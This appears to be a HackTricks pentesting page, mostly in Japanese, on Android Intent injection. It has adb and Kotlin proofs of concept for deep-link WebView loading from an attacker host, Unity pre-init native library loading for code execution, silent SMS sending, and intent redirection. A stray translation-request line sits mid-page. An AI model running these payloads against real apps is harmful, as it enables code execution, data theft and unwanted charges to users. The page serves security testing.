# Intent Injection

{{#include ../../banners/hacktricks-training.md}}

Intent injectionは、攻撃者が制御するIntentsや、後でIntentsに変換されるデータを受け取るコンポーネントを悪用します。Androidアプリpentestsで非常に一般的なパターンは次の2つです:

- 細工したextrasをexportedなActivities/Services/BroadcastReceiversに渡し、それが後でprivilegedな非-exportedコンポーネントに転送される。
- exportedなVIEW/BROWSABLE deep linksをトリガーして、攻撃者制御のURLsをinternalなWebViewsやその他の機密性の高いsinksに流し込む。

## Deep links → WebView sink (URL parameter injection)

アプリが次のようなカスタムスキームのdeep linkを公開している場合:
```text
myscheme://com.example.app/web?url=<attacker_url>
```
そして受信側の Activity が `url` クエリパラメータを WebView に転送する場合、アプリに任意のリモートコンテンツを自身の WebView コンテキストでレンダリングさせることができます。

adb を使った PoC:
```bash
# Implicit VIEW intent
adb shell am start -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"

# Or explicitly target an Activity
adb shell am start -n com.example/.MainActivity -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"
```
Impact
- HTML/JS がアプリの WebView プロファイル内で実行される。
- JavaScript が有効になっている場合（デフォルト、またはチェック順序の誤りにより）、公開されている `@JavascriptInterface` オブジェクトを列挙/利用したり、WebView の cookies/ローカルストレージを盗んでピボットすることができる。

See also:

{{#ref}}
webview-attacks.md
{{#endref}}

## チェック順序のバグで JavaScript が有効化される問題

繰り返し発生するバグは、最終的な URL ホワイトリスト/検証が完了する前に JavaScript（や他の許容的な WebView 設定）を有効にしてしまうことだ。早期のヘルパーがあなたの deep link を受け入れ、先に WebView が設定されると、後続の検査が不備だったり遅すぎたりしても、最終ロードは既に JavaScript が有効な状態で行われてしまう。

デコンパイルしたコードで確認するポイント:
- URL を異なる方法で parse/split/rebuild する複数のヘルパー（正規化が一貫していない）。
- 最終的なホスト/パスの allowlist チェックより前に `getSettings().setJavaScriptEnabled(true)` が呼ばれている。
- パイプライン例: parse → partial validate → configure WebView → final verify → loadUrl。


## Unity ランタイム: Intent-to-CLI extras → pre-init native library injection (RCE)

Unity ベースの Android アプリは通常、エントリー Activity として `com.unity3d.player.UnityPlayerActivity`（または `UnityPlayerGameActivity`）を使用する。Unity の Android テンプレートは、`unity` という特別な Intent extra を Unity ランタイム向けのコマンドラインフラグの文字列として扱う。エントリー Activity が exported（多くのテンプレートでデフォルト）になっている場合、ローカルの別アプリ — `BROWSABLE` があればウェブサイトでさえ — がこの extra を渡すことができる。

危険で文書化されていないフラグが、プロセス初期化のごく早い段階でネイティブコードの実行を引き起こす:

- Hidden flag: `-xrsdk-pre-init-library <absolute-path>`
- Effect: 初期化の非常に早い段階で `dlopen(<absolute-path>, RTLD_NOW)` が行われ、攻撃者が制御する ELF が対象アプリのプロセス内に、その UID と権限で読み込まれる。

Reverse-engineering excerpt (simplified):
```c
// lookup the arg value
initLibPath = FUN_00272540(uVar5, "xrsdk-pre-init-library");
// load arbitrary native library early
lVar2 = dlopen(initLibPath, 2); // RTLD_NOW
```
Why it works
- Intent の extra `unity` は Unity ランタイムのフラグとして解析される。
- pre-init フラグを指定すると、Unity は許可された linker namespace のパス内の攻撃者が制御する ELF パスを参照するようになる（以下の制約を参照）。

Conditions for exploitation
- Unity のエントリ Activity が exported されている（通常デフォルトで true）。
- For one-click remote via browser: エントリ Activity は `android.intent.category.BROWSABLE` を宣言しており、extras が `intent:` URL から渡せること。

Local exploitation (same device)
1) ペイロード ELF を victim app が読み取れるパスに配置する。簡単な方法: 悪意あるライブラリを自分の attacker app に同梱し、attacker の manifest で設定して `/data/app/.../lib/<abi>/` 以下に展開されるようにする:
```xml
<application android:extractNativeLibs="true" ...>
```
2) `unity` extra 内で CLI の pre-init フラグを使い、被害者の Unity activity を起動します。Example ADB PoC:
```bash
adb shell am start \
-n com.victim.pkg/com.unity3d.player.UnityPlayerActivity \
-e unity "-xrsdk-pre-init-library /data/app/~~ATTACKER_PKG==/lib/arm64/libpayload.so"
```
3) Unity calls `dlopen("/data/.../libpayload.so", RTLD_NOW)`; your payload runs in the victim process, inheriting all its app permissions (カメラ/マイク/ネットワーク/ストレージ 等) and access to in‑app sessions/data.

Notes
- The exact `/data/app/...` path varies across devices/installs. An attacker app can retrieve its own native lib dir at runtime via `getApplicationInfo().nativeLibraryDir` and communicate it to the trigger.
- The file need not end with `.so` if it is a valid ELF – `dlopen()` cares about ELF headers, not extensions.

Remote one‑click via browser (conditional)
If the Unity entry activity is exported with `BROWSABLE`, a website can pass extras via an `intent:` URL:
```text
intent:#Intent;package=com.example.unitygame;scheme=whatever;\
S.unity=-xrsdk-pre-init-library%20/data/local/tmp/malicious.so;end;
```
しかし、最新の Android では dynamic linker namespaces と SELinux が多くの公開パス（例: `/sdcard/Download`）からの読み込みをブロックします。次のようなエラーが表示されます:
```
library "/sdcard/Download/libtest.so" ("/storage/emulated/0/Download/libtest.so") needed
or dlopened by "/data/app/.../lib/arm64/libunity.so" is not accessible for the
namespace: [name="clns-...", ... permitted_paths="/data:/mnt/expand:/data/data/com.example.unitygame"]
```
バイパス戦略: アプリのプライベートストレージ（例：HTTPキャッシュ）下に攻撃者が制御するバイトをキャッシュするアプリを狙う。許可されたパスに `/data` やアプリのプライベートディレクトリが含まれるため、`-xrsdk-pre-init-library` をアプリのキャッシュ内の絶対パスに向けることでリンカの制約を満たし、コード実行を得ることができる。これは他のAndroidアプリで観測された以前の cache-to-ELF RCE パターンと同様である。


## Confused‑Deputy: ACTION_SENDTO によるサイレント SMS/MMS (Wear OS Google Messages)

一部のデフォルトメッセージングアプリは暗黙的なメッセージングIntentを誤って自動実行し、これを confused‑deputy プリミティブに変えてしまう：権限のない任意のアプリが `Intent.ACTION_SENDTO` を `sms:`, `smsto:`, `mms:`, または `mmsto:` とともにトリガーすると、確認UIなしかつ `SEND_SMS` パーミッションなしで即時送信を引き起こす可能性がある。

Key points
- Trigger: implicit `ACTION_SENDTO` + messaging URI scheme.
- Data: set recipient in the URI, message text in the `"sms_body"` extra.
- Permissions: none (no `SEND_SMS`), relies on the default SMS/MMS handler.
- Observed: Google Messages for Wear OS (patched May 2025). Other handlers should be assessed similarly.

Minimal payload (Kotlin)
```kotlin
val intent = Intent(Intent.ACTION_SENDTO).apply {
data = Uri.parse("smsto:+11234567890") // or sms:, mms:, mmsto:
putExtra("sms_body", "Hi from PoC")
// From a non-Activity context add NEW_TASK
addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
}
startActivity(intent)
```
ADB PoC (特別な権限不要)
```bash
# SMS/SMS-to
adb shell am start -a android.intent.action.SENDTO -d "smsto:+11234567890" --es sms_body "hello"
adb shell am start -a android.intent.action.SENDTO -d "sms:+11234567890"   --es sms_body "hello"

# MMS/MMS-to (handler-dependent behaviour)
adb shell am start -a android.intent.action.SENDTO -d "mmsto:+11234567890" --es sms_body "hello"
adb shell am start -a android.intent.action.SENDTO -d "mms:+11234567890"   --es sms_body "hello"
```
Attack surface expansion (Wear OS)
- Activityを起動できる任意のコンポーネントは同じペイロードを発火させ得る: Activities、foreground Services（`FLAG_ACTIVITY_NEW_TASK` を伴う）、Tiles、Complications。
- デフォルトハンドラが自動送信する場合、OEMポリシーに依存して、悪用はワンタップで済むか、バックグラウンドから完全にサイレントに行える可能性がある。

Pentest checklist
- Resolve `ACTION_SENDTO` をターゲット上で解決してデフォルトハンドラを特定する；作成UIを表示するかサイレントに送信するかを確認する。
- 振る舞いの違いを確認するため、4つのスキーム（`sms:`, `smsto:`, `mms:`, `mmsto:`）とエクストラ（`sms_body`、MMSの場合は任意で `subject`）を試す。
- 実機でテストする際は、有料宛先／プレミアムレート番号を考慮する。

## Other classic Intent injection primitives

- startActivity/sendBroadcast において攻撃者提供の `Intent` extras を使い、それが後で再解析（`Intent.parseUri(...)`）され実行されるパターン。
- パーミッションチェックなしに Intents を non-exported なセンシティブコンポーネントへ転送する exported proxy components。

---

## Automating exported-component testing (Smali-driven ADB generation)

Exported コンポーネントが特定の extras を期待している場合、ペイロードの形を推測するのは時間の無駄と偽陰性を招く。Smali からキー／型を直接自動検出し、実行可能な adb コマンドを生成できる。

Tool: APK Components Inspector
- Repo: https://github.com/thecybersandeep/apk-components-inspector
- Approach: decompile and scan Smali for calls like `getStringExtra("key")`, `getIntExtra("id", ...)`, `getParcelableExtra("redirect_intent")`, `getSerializableExtra(...)`, `getBooleanExtra(...)`, `getAction()`, `getData()` to infer which extras and fields are consumed by each component.
- Output: for every exported Activity/Service/Receiver/Provider, the tool prints a short explanation and the exact `adb shell am ...`/`cmd content ...` command with correctly typed flags.

Install
```bash
git clone https://github.com/thecybersandeep/apk-components-inspector
cd apk-components-inspector
python3 -m venv venv && source venv/bin/activate
pip install androguard==3.3.5 rich
```
使い方
```bash
python apk-components-inspector.py target.apk
```
そのファイル（src/mobile-pentesting/android-app-pentesting/intent-injection.md）の内容を貼ってください。内容を受け取ったら、指定どおりマークダウンやタグを保持して日本語に翻訳します。
```bash
adb shell am start -n com.target/.ExportedActivity --es url https://example.tld
adb shell am startservice -n com.target/.ExportedService --ei user_id 1337 --ez force true
adb shell am broadcast -n com.target/.ExportedReceiver -a com.target.ACTION --es redirect_intent "intent:#Intent;component=com.target/.Internal;end"
adb shell cmd content query --uri content://com.target.provider/items
```
ADB am extras チートシート（type-aware flags）
- 文字列: `--es key value` | 文字列配列: `--esa key v1,v2`
- 整数: `--ei key 123` | 整数配列: `--eia key 1,2,3`
- ブール値: `--ez key true|false`
- 長整数: `--el key 1234567890`
- 浮動小数点: `--ef key 1.23`
- URI（extra）: `--eu key content://...` | データURI (Intent data): `-d content://...`
- コンポーネント extra: `--ecn key com.pkg/.Cls`
- ヌル文字列 extra: `--esn key`
- 共通フラグ: `-a <ACTION>` `-c <CATEGORY>` `-t <MIME>` `-f <FLAGS>` `--activity-clear-task --activity-new-task`

Pro tips for Providers
- Use `adb shell cmd content query|insert|update|delete ...` to hit ContentProviders without agents.
- For SQLi probing, vary `--projection` and `--where` (aka selection) when the underlying provider is SQLite-backed.

フルパイプライン自動化（インタラクティブ実行器）
```bash
# generate and capture commands then execute them one by one interactively
python apk-components-inspector.py app.apk | tee adbcommands.txt
python run_adb_commands.py
```
<details>
<summary>adbコマンドを解析して実行するヘルパースクリプト</summary>
```python
import subprocess

def parse_adb_commands(file_path):
with open(file_path, 'r') as file:
lines = file.readlines()
commands = []
current = []
for line in lines:
s = line.strip()
if s.startswith("adb "):
current = [s]
elif s.startswith("#") or not s:
if current:
full = ' '.join(current).replace(" \\ ", " ").replace("\\", "").strip()
commands.append(full)
current = []
elif current:
current.append(s)
if current:
full = ' '.join(current).replace(" \\ ", " ").replace("\\", "").strip()
commands.append(full)
return commands

for i, cmd in enumerate(parse_adb_commands('adbcommands.txt'), 1):
print(f"\nCommand {i}: {cmd}")
input("Press Enter to execute this command...")
try:
r = subprocess.run(cmd, shell=True, check=True, text=True, capture_output=True)
print("Output:\n", r.stdout)
if r.stderr:
print("Errors:\n", r.stderr)
except subprocess.CalledProcessError as e:
print(f"Command failed with error:\n{e.stderr}")
```
</details>

デバイス上で実行: インスペクタは Python ベースで、`apktool`/`androguard` が利用可能な Termux や root 化された端末上で動作します。

---

## Intent Redirection (CWE-926) – 発見と悪用

Pattern
- 公開されたエントリポイント (Activity/Service/Receiver) が受信した Intent を読み、ソース／データを検証せずに内部または外部へ転送する。例:
- `startActivity(getIntent())`
- `startActivity(intent)` （ここで `intent` は `redirect_intent`/`next_intent`/`pending_intent` のような extra から来ている、または `Intent.parseUri(...)` によるもの）
- `action`/`data`/`component` フィールドをチェックなしに信頼している；呼び出し元の識別を確認していない。

What to search in Smali/Java
- `getParcelableExtra("redirect_intent")`、`getParcelable("intent")`、`getIntent().getParcelableExtra(...)` の使用。
- 攻撃者に影響された Intent に対する直接の `startActivity(...)`、`startService(...)`、`sendBroadcast(...)`。
- `getCallingPackage()`/`getCallingActivity()` のチェックやカスタム権限ゲートが欠如している。

ADB PoC templates
- 追加の Intent を特権の内部 Activity に転送する Proxy Activity:
```bash
adb shell am start -n com.target/.ProxyActivity \
--es redirect_intent 'intent:#Intent;component=com.target/.SensitiveActivity;end'
```
- Exported Service が `redirect_intent` parcelable を受け入れる:
```bash
adb shell am startservice -n com.target/.ExportedService \
--es redirect_intent 'intent:#Intent;component=com.target/.PrivService;action=com.target.DO;end'
```
- エクスポートされた Receiver（検証なしに中継する）:
```bash
adb shell am broadcast -n com.target/.RelayReceiver -a com.target.RELAY \
--es forwarded 'intent:#Intent;component=com.target/.HiddenActivity;S.extra=1;end'
```
singleTask-style の動作に役立つフラグ
```bash
# Ensure a fresh task when testing Activities that check task/intent flags
adb shell am start -n com.target/.ExportedActivity --activity-clear-task --activity-new-task
```
実際の事例（影響は様々）:
- CVE-2024-26131 (Element Android): exported flows により WebView の操作、PIN bypass、login hijack に繋がる。
- CVE-2023-44121 (LG ThinQ Service): exported receiver action `com.lge.lms.things.notification.ACTION` → システムレベルの影響。
- CVE-2023-30728 (Samsung PackageInstallerCHN < 13.1.03.00): redirection → arbitrary file access（ユーザー操作を伴う）。
- CVE-2022-36837 (Samsung Email < 6.1.70.20): implicit Intents が content を leak する。
- CVE-2021-4438 (React Native SMS User Consent).
- CVE-2020-14116 (Xiaomi Mi Browser).


---

## References

- [Android – Access to app-protected components](https://blog.oversecured.com/Android-Access-to-app-protected-components/)
- [Samsung S24 Exploit Chain Pwn2Own 2024 Walkthrough](https://medium.com/@happyjester80/samsung-s24-exploit-chain-pwn2own-2024-walkthrough-c7a3da9a7a26)
- [Pwn2Own Ireland 2024 – Samsung S24 attack chain (whitepaper)](https://maliciouserection.com/2025/05/13/pwn2own-ireland-2024-samsung-s24-attack-chain-whitepaper.html)
- [Demonstration video](https://www.youtube.com/watch?v=LAIr2laU-So)
- [Automating Android App Component Testing with New APK Inspector (blog)](https://www.mobile-hacker.com/2025/09/18/automating-android-app-component-testing-with-new-apk-inspector/)
- [APK Components Inspector – GitHub](https://github.com/thecybersandeep/apk-components-inspector)
- [Google guidance on intent redirection](https://support.google.com/faqs/answer/9267555?hl=en)
- [OVAA vulnerable app](https://github.com/oversecured/ovaa)
- [Exported Service PoC APK](https://github.com/nhattm3006/android-poc/blob/main/Exported%20Service/poc.apk)
- [Ostorlab – 100M installs image app deep dive (component summary example)](https://medium.com/@ostorlab/this-article-is-a-technical-deep-dive-showing-how-a-100m-installation-image-application-can-6343ce8ea076)
- [CVE-2024-26131 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2024-26131)
- [CVE-2023-44121 – CVE.org](https://www.cve.org/CVERecord?id=CVE-2023-44121)
- [CVE-2023-30728 – CVE.org](https://www.cve.org/CVERecord?id=CVE-2023-30728)
- [CVE-2022-36837 – CVE.org](https://www.cve.org/CVERecord?id=CVE-2022-36837)
- [CVE-2021-4438 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-4438)
- [CVE-2020-14116 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2020-14116)
- [CVE-2025-59489 – Arbitrary Code Execution in Unity Runtime (blog)](https://flatt.tech/research/posts/arbitrary-code-execution-in-unity-runtime/)
- [Unity docs – Android custom activity command-line](https://docs.unity3d.com/6000.0/Documentation/Manual/android-custom-activity-command-line.html)
- [Unity Security Sept-2025-01 advisory](https://unity.com/security/sept-2025-01)
- [HEXACON talk – Messenger one-click cache-based RCE pattern (slides)](https://www.hexacon.fr/slides/Calvanno-Defense_through_Offense_Building_a_1-click_Exploit_Targeting_Messenger_for_Android.pdf)
- [CVE-2025-12080 — Intent Abuse in Google Messages for Wear OS](https://towerofhanoi.it/writeups/cve-2025-12080/)
- [PoC repo – io-no/CVE-2025-12080](https://github.com/io-no/CVE-Reports/tree/main/CVE-2025-12080)
- [Android docs – Intents and Intent Filters](https://developer.android.com/guide/components/intents-filters)


{{#include ../../banners/hacktricks-training.md}}
